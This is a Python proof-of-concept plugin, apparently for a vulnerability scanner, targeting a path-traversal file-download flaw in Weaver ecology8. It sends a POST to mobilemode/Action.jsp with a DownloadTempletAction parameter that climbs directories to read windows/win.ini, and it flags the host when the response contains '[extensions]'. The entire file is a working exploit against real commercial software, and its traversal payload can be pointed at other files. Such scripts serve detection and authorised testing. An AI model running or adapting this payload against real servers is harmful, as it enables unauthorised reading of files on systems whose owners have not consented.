#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'ecology8 mobilemode download'
        self.keyword = ['ecology8', 'download']
        self.info = 'ecology8 mobilemode download'
        self.type = 'download'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path +"mobilemode/Action.jsp"
                    data = 'invoker=com.weaver.formmodel.mobile.servlet.DownloadTempletAction&url=/mobilemode/actiontemplet/../../../../../../../../../../../../../../windows/win.ini'

                    async with session.post(url=url,data=data) as res:
                        if res!=None:
                            text = await res.text()
                            if '[extensions]' in text:
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": url, "key": "ecology8 download"})
                                return